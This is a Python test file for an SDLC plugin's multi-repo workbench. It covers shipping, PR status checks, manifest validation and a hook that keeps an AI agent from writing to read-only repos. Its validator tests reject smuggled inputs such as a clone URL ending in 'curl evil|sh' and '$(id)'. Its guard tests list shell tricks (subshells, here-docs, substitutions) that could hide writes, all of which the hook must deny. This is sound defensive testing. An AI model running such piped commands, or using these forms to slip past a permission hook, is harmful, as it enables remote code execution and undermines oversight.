        row = next(line for line in index.splitlines() if line.startswith("| [0005]"))
        self.assertNotIn("superseded", row.lower())
        adr5 = read_doc("docs", "adr", "0005-greenfield-monorepo-layout.md")
        self.assertIn("[ADR 0025]", adr5)
        self.assertNotIn("Superseded", adr5)
        for page in ("Project-setup.md", "Configuration.md", "Where-things-live.md"):
            self.assertIn("workbench", read_doc("docs", "wiki", page).lower(), page)
        self.assertIn("workbench.json", read_doc("docs", "wiki", "Where-things-live.md"))
        self.assertIn("Workbench", read_doc("CHANGELOG.md").split("## 3.7.0")[0])


class PreferredStacks(unittest.TestCase):
    def test_greenfield_proposes_the_preferred_stacks(self):
        refs = ("skills", "setting-up-projects", "references")
        self.assertIn("stacks.md", read_doc(*refs, "greenfield.md").split("## `skeleton`")[0])
        self.assertIn("stacks.md", read_doc(*refs, "workbench.md").split("## `skeleton`")[0])
        stacks = read_doc(*refs, "stacks.md")
        sections = {s.split("\n", 1)[0].strip(): s for s in stacks.split("\n## ")[1:]}
        expected = {
            "Nuxt": ["SPA", "ssr: false", "Nuxt UI", "Pinia", "Pinia Colada", "Zod", "pnpm create nuxt"],
            "React": ["Vite", "shadcn/ui", "Zustand", "TanStack Query", "React Router", "Zod",
                      "pnpm create vite"],
            "Node": ["Hono", "PostgreSQL", "Drizzle", "Zod", "Cloud Run", "Cloud SQL", "Cloudflare Workers", "Neon",
                     "pnpm create hono"],
            "Go": ["Gin", "oapi-codegen", "pgx/v5", "sqlc", "golang-migrate", "Cloud Run", "Cloud SQL",
                   "go mod init"],
        }
        for stack, pieces in expected.items():
            section = next((v for k, v in sections.items() if k.startswith(stack)), None)
            self.assertIsNotNone(section, stack)
            for piece in pieces:
                self.assertIn(piece, section, (stack, piece))
            for command in ("install", "test", "lint", "typecheck", "build"):
                self.assertRegex(section, rf"\|\s*`?{command}`?\s*\|", (stack, command))


class WorkbenchShipCase(WorkbenchFeatureCase):
    CHANGE = "# Shop checkout\n\n## Acceptance criteria\n\n## Acceptance tests\n\n| AC | Test | Run |\n|---|---|---|\n"

    def setUp(self):
        super().setUp()
        self.write_json("workbench.json", {"repos": [
            {"name": "web", "url": "https://example.com/web.git", "role": "app", "write": True,
             "contract": {"consumes": "v1"}},
            {"name": "api", "url": "https://example.com/api.git", "role": "app", "write": True,
             "contract": {"provides": "v1"}},
            {"name": "specs", "url": "u3", "role": "specs"},
        ]})
        self.write(".sdlc/feat/change.md", self.CHANGE)

    def ship(self, *extra, env=None):
        import subprocess
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "ship.py"), "--root", self.root,
                            "feat", *extra], capture_output=True, encoding="utf-8", errors="replace",
                           env={**os.environ, **(env or {})})
        return p.returncode, p.stdout + p.stderr



class WorkbenchShip(WorkbenchShipCase):
    def test_ship_commits_each_repo_in_merge_order(self):
        import verify
        for name in ("web", "api"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
        self.write("api/a.py", "x = 1\n")
        self.write("web/b.py", "y = 1\n")
        self.state("deviation", "feat", "workbench.json web/b.py What: contract roles. Why: test. Effect: none.")
        # A passing verify covers the app repos too: a later change in one is unverified
        last, notes = verify.full(self.root, "feat", 60, whole=True)
        self.assertEqual(last["result"], "pass", last["failures"] + notes)
        self.assertTrue(verify.status(self.root, "feat")["reuse"])
        self.write("api/c.py", "z = 1\n")
        st = verify.status(self.root, "feat")
        self.assertFalse(st["reuse"])
        self.assertIn("api", st["reason"])
        os.remove(self.path("api/c.py"))
        # A file in an app repo that no task names is drift
        self.write("web/stray.py", "s = 1\n")
        last, _ = verify.full(self.root, "feat", 60, whole=True)
        self.assertTrue(any("web/stray.py" in f for f in last["failures"]), last["failures"])
        os.remove(self.path("web/stray.py"))

        code, out = self.ship("--review", "No review ran: test.")
        self.assertEqual(code, 0, out)
        result = json.loads(out)
        repos = result["repos"]
        self.assertEqual([r["name"] for r in repos], ["(workbench)", "api", "web"])
        for r in repos[1:]:
            self.assertIn(r["path"], (self.path("api"), self.path("web")))
            self.assertEqual(git_out(r["path"], "branch", "--show-current"), "feat-x")
            self.assertTrue(r["staged"], r)
            git(r["path"], "commit", "-q", "-F", r["message"])
            msg = git_out(r["path"], "log", "-1", "--format=%B")
            self.assertIn("Shop checkout", msg)
            self.assertIn(".sdlc/feat/change.md", msg)
        self.assertIn("workbench.json", repos[0]["staged"])
        with open(repos[1]["pr_body"], encoding="utf-8") as f:
            body = f.read()
        self.assertIn("https://example.com/web.git", body)
        self.assertIn("(workbench)", body)
        self.assertIn("1. (workbench)", body)
        self.assertIn("2. api", body)
        self.assertIn("3. web", body)

    def fake_gh(self, states):
        """SDLC_GH: a gh stand-in answering `pr view --json state,mergedAt -- <url>` from `states`."""
        data = self.write("gh-states.json", json.dumps(states))
        script = self.write("fake_gh.py", "import json, sys\n"
                            f"states = json.load(open({data!r}))\n"
                            "assert sys.argv[-2] == '--', sys.argv\n"
                            "url = sys.argv[-1]\n"
                            "s = states[url]\n"
                            "print(json.dumps({'state': s[0], 'mergedAt': s[1]}))\n")
        return {"SDLC_GH": f'"{sys.executable}" "{script}"'}

    def test_out_of_order_merge_warns(self):
        urls = {"(workbench)": "https://example.com/wb/pull/1", "api": "https://example.com/api/pull/2",
                "web": "https://example.com/web/pull/3"}
        code, out = self.ship("--status")
        self.assertEqual(code, 0, out)
        self.assertFalse(json.loads(out)["done"])
        for name, url in urls.items():
            code, out = self.state("pr", "feat", name, url)
            self.assertEqual(code, 0, out)
        self.assertEqual(self.state("pr", "feat", "../x", "u")[0], 1)
        # The consumer merged while its provider is still open: a warning naming both, never a block
        code, out = self.ship("--status", env=self.fake_gh({
            urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["OPEN", None],
            urls["web"]: ["MERGED", "2026-11-13T11:00:00Z"]}))
        self.assertEqual(code, 0, out)
        r = json.loads(out)
        self.assertFalse(r["done"])
        self.assertEqual(len(r["warnings"]), 1, r["warnings"])
        self.assertIn("web", r["warnings"][0])
        self.assertIn("api", r["warnings"][0])
        # Both merged, the consumer first: still warned; the feature is done
        r = json.loads(self.ship("--status", env=self.fake_gh({
            urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["MERGED", "2026-11-13T12:00:00Z"],
            urls["web"]: ["MERGED", "2026-11-13T11:00:00Z"]}))[1])
        self.assertTrue(r["done"])
        self.assertTrue(any("web" in w and "api" in w for w in r["warnings"]), r["warnings"])
        # In order: no warning
        r = json.loads(self.ship("--status", env=self.fake_gh({
            urls["(workbench)"]: ["MERGED", "2026-11-13T10:00:00Z"], urls["api"]: ["MERGED", "2026-11-13T11:00:00Z"],
            urls["web"]: ["MERGED", "2026-11-13T12:00:00Z"]}))[1])
        self.assertEqual((r["done"], r["warnings"]), (True, []))


def pre_hook(case, tool, cwd=None, env=None, **tool_input):
    """The deny reason pretooluse.py gives this call, else None."""
    from helpers import run_hook
    payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input, "cwd": cwd or case.root}
    code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], payload, cwd or case.root, env)
    case.assertEqual(code, 0, err)
    hso = (out or {}).get("hookSpecificOutput", {})
    return hso.get("permissionDecisionReason", "") if hso.get("permissionDecision") == "deny" else None


class ReviewRound1Guards(WorkbenchGuardsCase):
    """Review round 1: the read-only guard follows every way a command line moves or names a repo, and fails closed."""

    def test_read_only_guard_follows_folder_changes_and_fails_closed(self):
        denied = ["cd specs && echo x > b.md", "cd specs; echo x >> b.md", "pushd specs && touch b.md",
                  "chdir specs && rm a.md", "git --git-dir=specs/.git --work-tree=specs commit -am x",
                  "git --work-tree specs add -A", "GIT_DIR=specs/.git git commit -m x", "git -C specs switch -c x",
                  "git -C specs branch -D old", "cd specs && git branch new"]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        for command in ("Set-Location specs; 'x' | Out-File b.md", "sl specs; Set-Content b.md x"):
            self.assertIsNotNone(self.pre("PowerShell", command=command), command)
        for command in ("git -C specs branch -a", "cd specs && git log > ../log.txt", "cd api && echo x > a.md"):
            self.assertIsNone(self.pre("Bash", command=command), command)
        # One malformed entry elsewhere in the manifest doesn't unguard the read-only repo
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True, "owner": 1},
            {"name": "specs", "url": "u2", "role": "specs", "owner": "@org/ba"},
            {"name": "x", "role": "nope"},
        ]})
        reason = self.pre("Write", file_path=self.path("specs/b.md"), content="x")
        self.assertIsNotNone(reason)
        self.assertIn("@org/ba", reason)
        # A host without CLAUDE_PROJECT_DIR: the workbench is found above the call's folder
        reason = pre_hook(self, "Bash", cwd=self.path("specs"), env={"CLAUDE_PROJECT_DIR": ""}, command="echo x > b.md")
        self.assertIsNotNone(reason)


class ReviewRound1Manifest(WorkbenchTestCase):
    def test_manifest_values_stay_clone_urls_and_folders_in_the_workbench(self):
        import sdlc_scopes
        for url in ("https://github.com/o/r.git", "git@github.com:o/r.git", "ssh://git@h/o/r", "/tmp/r",
                    "C:\\repos\\r", "file:///tmp/r", "u1"):
            self.assertEqual(sdlc_scopes.check_url(url), url)
        for url in ("https://h/x.git; curl evil|sh", "ext::sh -c touch% x", "fd::3", "a b", "$(id)", "`id`", "-u",
                    "https://h/x\n", ""):
            with self.assertRaises(ValueError, msg=url):
                sdlc_scopes.check_url(url)
        base = {"url": "u", "role": "specs"}
        for repos, msg in (([dict(base, name="contract")], "reserved"), ([dict(base, name="CLAUDE.md")], "reserved"),
                           ([dict(base, name="specs"), dict(base, name="Specs")], "duplicate"),
                           ([dict(base, name="s", url="https://h/x.git; id")], "clone URL")):
            self.write_json("workbench.json", {"repos": repos})
            with self.assertRaisesRegex(ValueError, msg):
                sdlc_scopes.manifest(self.root)
        # A listed folder that links outside the workbench is never used as the repo
        outside = self.origin("elsewhere")
        os.symlink(outside, self.path("api"))
        with self.assertRaisesRegex(ValueError, "outside the workbench"):
            sdlc_scopes.repo_dir(self.root, "api")
        self.assertEqual(sdlc_scopes.repo_dir(self.root, "web"), self.path("web"))

    def test_listed_repos_come_back_after_a_fresh_clone(self):
        import doctor
        api = self.origin("api")
        self.write_json("workbench.json", {"repos": [{"name": "api", "url": api, "role": "app", "write": True},
                                                     {"name": "specs", "url": self.origin("specs"),
                                                      "role": "specs"}]})
        # A hand-written ignore line in another spelling, and a cp1252 byte doctor must not crash on
        with open(self.path(".gitignore"), "wb") as f:
            f.write(b"# caf\xe9\nspecs/\n")
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        rows = {c["check"]: c for c in r.checks}
        self.assertEqual(rows["workbench repos"]["fix"], "scaffold.py workbench clone")
        self.assertNotIn(api, json.dumps(r.checks))
        code, out, err = self.run_scaffold("workbench", "clone")
        self.assertEqual(code, 0, (out, err))
        self.assertEqual(sorted(out["cloned"]), ["api", "specs"])
        self.assertTrue(os.path.isfile(self.path("api/README.md")))
        self.assertEqual(self.gitignore().count("specs/") + self.gitignore().count("/specs/"), 1, self.gitignore())
        self.assertIn("/api/", self.gitignore())
        with open(self.path(".gitignore"), "rb") as f:
            self.assertTrue(f.read().startswith(b"# caf\xe9\n"))  # the user's bytes survive the rewrite
        code, out, err = self.run_scaffold("workbench", "clone", "api")
        self.assertEqual((code, out["cloned"], out["already_cloned"]), (0, [], ["api"]), err)
        code, out, err = self.run_scaffold("workbench", "clone", "nope")
        self.assertNotEqual(code, 0)
        # remove drops the line in any spelling
        rmtree(self.path("specs"))
        code, out, err = self.run_scaffold("workbench", "remove", "specs")
        self.assertEqual(code, 0, (out, err))
        self.assertFalse([x for x in self.gitignore() if x.strip("/") == "specs"], self.gitignore())
        # No temp file is left behind when a write fails
        from unittest import mock
        with mock.patch.object(scaffold.os, "replace", side_effect=OSError("disk")):
            with self.assertRaises(OSError):
                scaffold._write_atomic(self.path("workbench.json"), "{}")
        self.assertFalse([f for f in os.listdir(self.root) if f.startswith(".tmp-")])

    def test_contract_runs_keep_the_root_test(self):
        self.write_json(".sdlc/config.json", MONOREPO)
        self.write_json(".sdlc/scaffold.lock.json", {"command_runs": {
            scaffold.ROOT_SCOPE: {"test": {"command": "pnpm -r test", "exit": 0}}}})
        out = scaffold.cmd_contract(scaffold.Project(self.root), None)
        self.assertIn("test", out["runs"][scaffold.ROOT_SCOPE])


class ReviewRound1Feature(WorkbenchFeatureCase):
    def test_writes_wait_for_the_feature_branch(self):
        reason = pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x")
        self.assertIsNotNone(reason)
        self.assertIn("repo feat api", reason)
        self.assertIsNotNone(pre_hook(self, "Bash", command="cd api && echo x > a.py"))
        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("docs/a.md"), content="x"))
        self.assertIsNone(pre_hook(self, "Bash", command="cat api/README.md"))
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x"))
        # No active feature (setup, or between features): writes stay open
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        self.assertIsNone(pre_hook(self, "Write", file_path=self.path("web/a.py"), content="x"))

    def test_repo_refuses_a_default_branch_and_adopts_its_own(self):
        import sdlc_scopes
        default = next(b for b in ("main", "master") if git_out(self.root, "rev-parse", "--verify", "-q", b))
        git(self.root, "checkout", "-q", default)
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("default branch", json.loads(out)["error"])
        self.assertEqual(git_out(self.path("api"), "branch", "--show-current"), "main")
        git(self.root, "checkout", "-q", "feat-x")
        # A branch a crashed run created, checked out and grown from the base, is adopted
        base = git_out(self.path("web"), "rev-parse", "HEAD")
        git(self.path("web"), "checkout", "-q", "-b", "feat-x")
        code, out = self.state("repo", "feat", "web")
        self.assertEqual(code, 0, out)
        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["web"], {"branch": "feat-x", "base": base})
        # A link out of the workbench is refused
        import shutil
        rmtree(self.path("api"))
        os.symlink(self.origin("elsewhere"), self.path("api"))
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("outside the workbench", json.loads(out)["error"])

    def test_read_only_moved_needs_one_active_feature(self):
        import diff_stats
        specs = self.path("specs")
        self.assertEqual(self.state("repo", "feat", "specs")[0], 0)
        self.write("specs/c.md", "c")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "c")
        self.assertEqual(len(diff_stats.moved_read_only(self.root, [])), 1)
        code, out = self.state("new", "feat2", "--track", "S", "--risk", "low", "--task", "x | AC-001 | a.py")
        self.assertEqual(code, 0, out)
        self.assertEqual(diff_stats.moved_read_only(self.root, []), [])


class ReviewRound1Ship(WorkbenchShipCase):
    def test_ship_acts_only_on_writable_repos_and_refuses_before_moving(self):
        import verify
        for name in ("web", "api"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
        self.write("api/a.py", "x = 1\n")
        self.write("api/broken", "")  # api's own check would fail if it ran
        manifest = {"repos": [
            {"name": "web", "url": "https://example.com/web.git", "role": "app", "write": True},
            {"name": "api", "url": "https://example.com/api.git", "role": "specs"},
            {"name": "specs", "url": "u3", "role": "specs"}]}
        self.write_json("workbench.json", manifest)
        failures = verify.repo_failures(self.root, "feat", 60)
        self.assertEqual(len(failures), 1, failures)
        self.assertTrue(failures[0].startswith("not run: api isn't a writable repo"), failures)
        self.assertNotIn("api", [n for n, _ in verify.branched_repos(self.root, "feat")])
        before = self.state_text()
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("api isn't a writable repo", out)
        self.assertEqual(self.state_text(), before)
        # A repo on the wrong branch, or a listed folder not gitignored: refused with the state untouched
        manifest["repos"][1]["role"], manifest["repos"][1]["write"] = "app", True
        self.write_json("workbench.json", manifest)
        os.remove(self.path("api/broken"))
        git(self.path("api"), "checkout", "-q", "main")
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("not the feature's branch", out)
        self.assertEqual(self.state_text(), before)
        git(self.path("api"), "checkout", "-q", "feat-x")
        self.write(".gitignore", "/api/\n/specs/\n")
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("web/ isn't gitignored", out)
        self.assertEqual(self.state_text(), before)

    def test_pr_urls_are_never_options_and_gh_errors_are_said(self):
        import sdlc_scopes
        for bad in ("--web", "-R=other/repo", "https://h/o/r/issues/1", "x y"):
            code, out = self.state("pr", "feat", "api", "--", bad)
            self.assertEqual(code, 1, (bad, out))
        self.assertEqual(sdlc_scopes.feature_prs("## PRs\n- api: --web\n- web: 12\n"), {"web": "12"})
        url = "https://example.com/api/pull/2"
        self.assertEqual(self.state("pr", "feat", "api", url)[0], 0)
        script = self.write("gh_fail.py", "import sys\nsys.stderr.write('gh: not logged in')\nsys.exit(4)\n")
        code, out = self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})
        self.assertEqual(code, 0, out)
        r = json.loads(out)
        self.assertFalse(r["done"])
        self.assertIn("not logged in", r["errors"][0])
        self.assertIn("api", r["errors"][0])


class ReviewRound2Guards(WorkbenchGuardsCase):
    """Review round 2: the guard reads every command a line runs (subshells, groups, keywords, substitutions) with
    the folder each runs in, and fails closed on a manifest it can't read."""

    def test_guard_reads_grouped_nested_and_substituted_commands(self):
        denied = ["(cd specs && echo x > b.md)", "(cd specs && git commit -am x)", "{ cd specs; rm a.md; }",
                  "if cd specs; then touch b; fi", "for f in x; do rm specs/a.md; done",
                  "while true; do rm specs/a.md; done", "! rm specs/a.md", "echo \"$(rm specs/a.md)\"",
                  "echo `rm specs/a.md`", "x=$(cd specs && touch b)", "cmd /c \"cd /d specs && del a.md\"",
                  "( cd specs ; echo x >b.md )", "{ rm specs/a.md;}", "time rm specs/a.md",
                  "(cd specs; (echo x > b.md))", "until false; do touch specs/b; done"]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        allowed = ["(cd specs && cat a.md) > out.txt", "(cd specs) && echo x > b.md", "echo '(cd specs && rm a.md)'",
                   "echo '$(rm specs/a.md)'", "cd api && (echo x > a.md)", "git -C specs log --oneline | head",
                   "if test -f specs/a.md; then echo yes > found.txt; fi"]
        for command in allowed:
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_unreadable_manifest_fails_closed_and_reserved_names_stay_the_workbenchs(self):
        self.write("workbench.json", "{ not json")
        for path in ("specs/b.md", "api/x.py"):
            reason = self.pre("Write", file_path=self.path(path), content="x")
            self.assertIsNotNone(reason, path)
            self.assertIn("workbench.json", reason)
        self.assertIsNotNone(self.pre("Bash", command="(cd specs && echo x > b.md)"))
        self.assertIsNone(self.pre("Write", file_path=self.path("workbench.json"), content="{}"))
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="x"))
        # A reserved name in the manifest never makes the workbench's own folder read-only
        self.write_json("workbench.json", {"repos": [{"name": "docs", "url": "u", "role": "specs"},
                                                     {"name": "specs", "url": "u2", "role": "specs"}]})
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="x"))
        self.assertIsNotNone(self.pre("Write", file_path=self.path("specs/b.md"), content="x"))


class ReviewRound2Manifest(WorkbenchTestCase):
    def test_add_ignores_before_it_clones(self):
        import argparse
        from unittest import mock
        args = argparse.Namespace(action="add", target="https://example.com/api.git", name=None, role="app",
                                  write=True, owner=None, contract=None)
        with mock.patch.object(scaffold, "_clone_into", side_effect=KeyboardInterrupt()):  # killed mid-clone
            with self.assertRaises(KeyboardInterrupt):
                scaffold.cmd_workbench(scaffold.Project(self.root), args)
        self.assertIn("/api/", self.gitignore())

    def test_clone_reports_what_it_cloned_when_one_fails(self):
        missing = os.path.join(self.root, "no-such-origin")
        self.write_json("workbench.json", {"repos": [
            {"name": "bad", "url": missing, "role": "specs"},
            {"name": "api", "url": self.origin("api"), "role": "app", "write": True}]})
        code, out, err = self.run_scaffold("workbench", "clone")
        self.assertEqual(code, 1, (out, err))
        self.assertEqual(out["cloned"], ["api"])
        self.assertEqual([f["name"] for f in out["failed"]], ["bad"])
        self.assertTrue(os.path.isfile(self.path("api/README.md")))


class ReviewRound2Feature(WorkbenchFeatureCase):
    def test_unbranched_backstop_reads_subshells_and_quotes_its_command(self):
        self.assertIsNotNone(pre_hook(self, "Bash", command="(cd api && echo x > a.py)"))
        self.assertIsNotNone(pre_hook(self, "Bash", command="echo \"$(touch web/b.py)\""))

    def test_branch_lines_hold_only_branch_names(self):
        import sdlc_scopes
        for line in ("- api: branch x;rm base abcdef1", "- api: branch -x base abcdef1",
                     "- api: branch a..b base abcdef1", "- api: branch $(id) base abcdef1"):
            self.assertEqual(sdlc_scopes.feature_repos("## Repos\n" + line + "\n"), {}, line)
        self.assertEqual(sdlc_scopes.feature_repos("## Repos\n- api: branch team/feat-x base abcdef1\n"),
                         {"api": {"branch": "team/feat-x", "base": "abcdef1"}})
        # A workbench branch name git allows but a shell would read is refused before it is recorded
        git(self.root, "checkout", "-q", "-b", "feat$x")
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("branch name", json.loads(out)["error"])

    def test_a_default_branch_with_a_slash_is_refused(self):
        git(self.root, "update-ref", "refs/remotes/origin/team/main", "HEAD")
        git(self.root, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/team/main")
        git(self.root, "checkout", "-q", "-b", "team/main")
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 1, out)
        self.assertIn("default branch", json.loads(out)["error"])

    def test_a_link_to_a_sibling_repo_is_refused(self):
        import shutil
        import sdlc_scopes
        rmtree(self.path("web"))
        os.symlink("specs", self.path("web"))
        with self.assertRaises(ValueError):
            sdlc_scopes.repo_dir(self.root, "web")
        code, out = self.state("repo", "feat", "web")
        self.assertEqual(code, 1, out)
        self.assertIn("link", json.loads(out)["error"])
        self.assertEqual(sdlc_scopes.repo_dir(self.root, "api"), self.path("api"))

    def test_diff_stats_reads_each_branched_repo(self):
        import subprocess
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write("api/a.py", "def helper():\n    return 1\n")
        self.write("web/b.py", "def unseen():\n    return 1\n")  # web isn't branched: not this feature's code
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "diff_stats.py"), "--root",
                            self.root, "--plan", self.path(".sdlc/feat/state.md")], capture_output=True,
                           encoding="utf-8", errors="replace")
        self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
        r = json.loads(p.stdout)
        self.assertIn("api/a.py", r["changed_files"])
        self.assertIn("api/a.py", r["new_files"])
        self.assertNotIn("web/b.py", r["changed_files"])
        self.assertIn(("helper", "api/a.py"), [(e["name"], e["file"]) for e in r["exports"]])
        self.assertEqual(r["totals"]["source_files"], 1)


class ReviewRound2Ship(WorkbenchShipCase):
    def test_pr_numbers_are_read_in_their_own_repo(self):
        # The fake answers MERGED only when gh runs in api/: a bare number names the PR of the folder gh runs in
        script = self.write("gh_where.py", "import json, os\n"
                            "print(json.dumps({'state': 'MERGED' if os.path.basename(os.getcwd()) == 'api'"
                            " else 'OPEN', 'mergedAt': '2026-11-13T10:00:00Z'}))\n")
        self.assertEqual(self.state("pr", "feat", "api", "api")[0], 1)  # not a number or URL
        self.assertEqual(self.state("pr", "feat", "api", "12")[0], 0)
        code, out = self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})
        self.assertEqual(code, 0, out)
        [row] = json.loads(out)["prs"]
        self.assertEqual((row["repo"], row["state"]), ("api", "MERGED"))

    def test_an_unlisted_nested_repo_is_refused_before_moving(self):
        for name in ("web", "api"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
        self.write("api/a.py", "x = 1\n")
        git(self.root, "init", "-q", "extra")
        self.write("extra/f.txt", "f")
        before = self.state_text()
        code, out = self.ship("--review", "No review ran: test.")
        self.assertNotEqual(code, 0, out)
        self.assertIn("extra/", out)
        self.assertEqual(self.state_text(), before)

    def test_refusals_quote_what_they_suggest(self):
        import ship
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        git(self.path("api"), "checkout", "-q", "main")
        with self.assertRaises(ship.Refused) as cm:
            ship.check_repos(self.root, self.state_text())
        self.assertIn("git -C api switch feat-x", str(cm.exception))


class ReviewRound3Guards(WorkbenchGuardsCase):
    """Review round 3: the guard lexes each shell's own syntax (comments, escapes, continuations, here-docs, case
    patterns; PowerShell's backtick escape and expressions) and fails closed on a config it can't read."""

    def test_bash_syntax_never_hides_a_write(self):
        denied = ["# it's a note\nrm specs/a.md", "echo it\\'s > specs/a.md", "cp a.md \\\nspecs/a.md",
                  "rm -rf \\\nspecs/old", "git -C specs \\\ncommit -m x",
                  "cat <<'EOF' > notes.txt\nit's (\nEOF\nrm specs/a.md", "cat <<-END\n\tx`\n\tEND\ntouch specs/b",
                  "(cd specs; case $x in a) true;; esac; echo x > b.md)", "echo \\` ; rm specs/a.md",
                  "x=1 # comment\ncd specs && touch b"]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        allowed = ["git commit -m \"$(cat <<'EOF'\nfix: rm specs/a.md -> specs/x (see `specs`)\nEOF\n)\"",
                   "echo '# rm specs/a.md'", "echo hi # > specs/a.md", "case $x in a) echo a;; esac; echo x > b.md",
                   "gh pr create --body \"$(cat <<'EOF'\nwrites `touch specs/b`\nEOF\n)\"",
                   "echo a#b > out.txt"]
        for command in allowed:
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_powershell_and_cmd_syntax_never_hide_a_write(self):
        for command in ('Write-Output "say `"hi`""; Remove-Item specs/a.md', "Remove-Item (Join-Path specs a.md)",
                        'Write-Output "$(Remove-Item specs/a.md)"', "Set-Location specs # go\nRemove-Item a.md"):
            self.assertIsNotNone(self.pre("PowerShell", command=command), command)
        self.assertIsNone(self.pre("PowerShell", command="Get-Content specs/a.md | Out-File out.txt"))
        for command in ('cmd /c "cd /d specs && del a.md"', 'pwsh -Command "Remove-Item (Join-Path specs a.md)"'):
            self.assertIsNotNone(self.pre("Bash", command=command), command)

    def test_an_unreadable_config_keeps_the_guards_on(self):
        self.write(".sdlc/config.json", "<<<<<<< HEAD\n{\"workbench\": true}\n=======\n")
        reason = self.pre("Write", file_path=self.path("specs/b.md"), content="x")
        self.assertIsNotNone(reason)
        self.assertIsNotNone(self.pre("Bash", command="cd specs && echo x > b.md"))
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="x"))


class ReviewRound3Feature(WorkbenchFeatureCase):
    def test_an_unreadable_config_keeps_the_branch_backstop_on(self):
        self.write(".sdlc/config.json", "{ broken")
        self.assertIsNotNone(pre_hook(self, "Write", file_path=self.path("api/a.py"), content="x"))


class ReviewRound3Manifest(WorkbenchTestCase):
    def test_a_refused_add_leaves_no_ignore_line(self):
        self.write("api/notes.txt", "mine")  # a folder of the user's, not a repo
        code, out, err = self.run_scaffold("workbench", "add", "https://example.com/api.git", "--role", "app")
        self.assertNotEqual(code, 0, (out, err))
        self.assertFalse([x for x in self.gitignore() if x.strip("/") == "api"], self.gitignore())
        self.assertTrue(os.path.isfile(self.path("api/notes.txt")))


class ReviewRound3Ship(WorkbenchShipCase):
    def test_status_reads_a_full_url_without_the_clone(self):
        import shutil
        url = "https://example.com/api/pull/2"
        self.assertEqual(self.state("pr", "feat", "api", url)[0], 0)
        rmtree(self.path("api"))
        script = self.write("gh_ok.py", "import json\nprint(json.dumps({'state': 'MERGED', "
                            "'mergedAt': '2026-11-13T10:00:00Z'}))\n")
        r = json.loads(self.ship("--status", env={"SDLC_GH": f'"{sys.executable}" "{script}"'})[1])
        self.assertEqual(r["prs"][0]["state"], "MERGED")
        self.assertNotIn("errors", r)


class ReviewRound4Guards(WorkbenchGuardsCase):
    """Review round 4: here-strings, arithmetic, here-docs a shell reads, PowerShell here-strings, expressions and
    script blocks; a command nested too deep is denied for that reason."""

    def test_bash_here_strings_arithmetic_and_shell_heredocs(self):
        denied = ["jq . <<< \"$x\"\ncp out.md specs/a.md", "(( n = 1 << 4 ))\nrm specs/a.md",
                  "cat <<EOF\nrm specs/a.md", "bash <<'EOF'\ncd specs\necho x > b.md\nEOF",
                  "cat <<EOF | sh\nrm specs/a.md\nEOF", "sh -s <<EOF\nrm specs/a.md\nEOF",
                  "bash -c \"$(cat <<'EOF'\nrm specs/a.md\nEOF\n)\""]
        for command in denied:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        for command in ("cat <<'EOF' > notes.md\nrm specs/a.md\nEOF", "grep x <<< 'rm specs/a.md'",
                        "echo $(( 1 << 4 )) > out.txt"):
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_powershell_here_strings_expressions_and_blocks(self):
        denied = ["$m = @'\nIt's done\n'@\ngit -C specs commit -m $m", "$m = @\"\nsay \"hi\"\n\"@\nRemove-Item specs/a.md",
                  "if (Test-Path specs/a.md) { Remove-Item specs/a.md }", "[void](New-Item -Path specs/x)",
                  "(Remove-Item specs/a.md)", "$null = New-Item specs/x", "Remove-Item (Join-Path specs a.md)",
                  "Get-ChildItem | ForEach-Object { Remove-Item specs/a.md }"]
        for command in denied:
            self.assertIsNotNone(self.pre("PowerShell", command=command), command)
        for command in ("if (Test-Path specs/a.md) { Get-Content specs/a.md }",
                        "$m = @'\nRemove-Item specs/a.md\n'@\nWrite-Output $m"):
            self.assertIsNone(self.pre("PowerShell", command=command), command)

    def test_round5_lexer_leftovers(self):
        self.assertIsNotNone(self.pre("PowerShell", command="(Set-Location specs); Remove-Item a.md"))
        self.assertIsNotNone(self.pre("Bash", command="bash <<< \"rm specs/a.md\""))
